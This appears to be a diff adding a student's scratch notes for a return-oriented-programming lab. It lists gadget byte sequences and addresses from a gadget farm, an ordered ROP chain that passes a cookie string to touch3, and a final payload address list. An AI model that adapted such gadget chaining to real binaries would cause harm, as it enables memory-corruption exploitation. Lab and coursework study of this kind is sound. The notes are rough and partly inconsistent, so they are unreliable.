@@ -1,0 +1,91 @@
+<setval_390>
+401945: c7 07 48 89 e0 91
+
+Sequence: 48 89 e0 -> movq %rsp, %rax
+Address: 401947
+
+
+<setval_227>
+40190b: c7 07 d1 48 89 c7
+
+Sequence: 48 89 c7 -> %movq %rax, %rdi
+Address: 40190e
+
+<getval_352>
+401919: b8 a2 21 d7 58
+
+Sequence: 58 -> popq %rax
+Address: 40191d
+
+push 48 into %rax -> 48 00 00 00 00 00 00 00
+
+<setval_223>
+40193e: c7 07 a1 89 c2 94
+
+Sequence: 89 c2 -> movl %eax, %edx
+Address: 401941
+
+<getval_213>
+401931: b8 89 d1 38 c9
+
+Sequence: 89 d1 -> movl %edx, %ecx
+Address: 401932
+
+<setval_200>
+40194c: c7 07 89 ce 28 d2
+
+Sequence: 89 ce -> movl %ecx, %esi
+Address: 40194e
+
+leaq -> <add_xy> -> address: 40192c
+
+<setval_366>
+4018f7: c7 07 48 89 c7 c3
+
+Sequence: 48 89 c7 -> movq %rax, %rdi
+Address: 4018f9
+
+***********RESTART**********
+
+
+
+1.) mov %rsp, %rax		--> 401947
+2.) mov %rax, %rdi		--> 4018f9 or 401906 or 40190e
+3.) pop %rax  	      	        --> 40191d
+4.) constant 0x48 / or 0x57 	--> xxx
+5.) movl %eax, %edx		--> 401941
+6.) movl %edx, %ecx 		--> 401932
+7.) movl %ecx, %esi 		--> 40194e or 401970 or 4019dd or 4019fe
+8.) lea (%rdi, %rsi, 1), %rax 	--> 40192c
+9.) mov %rax, %rdi   	 	--> 4018f9 or 401906 or 40190e
+10.) touch3 address   		--> 401862
+11.) string rep of cookie 	--> 34 64 66 31 33 38 39 32
+
+
+
+Pattern List:
+1.) mov	%rsp, %rax		--> 48 89 e0
+2.) mov	%rax, %rdi 		--> 48 89 c7
+3.) pop	%rax  	   		--> 58
+4.) constant 0x48 / or 0x57 	--> xxx
+5.) movl %eax, %edx    		--> 89 c2
+6.) movl %edx, %ecx 		--> 89 d1
+7.) movl %ecx, %esi 		--> 89 ce
+8.) lea	(%rdi, %rsi, 1), %rax 	--> 40192c
+9.) mov	%rax, %rdi   	 	--> 48 89 c7
+10.) touch3 address		--> 401862
+11.) string rep	of cookie 	--> 
+
+
+
+JESUS:
+
+4019c2
+4018f9
+401923
+push 48
+401a04
+401932
+40192c
+4019f9
+401862
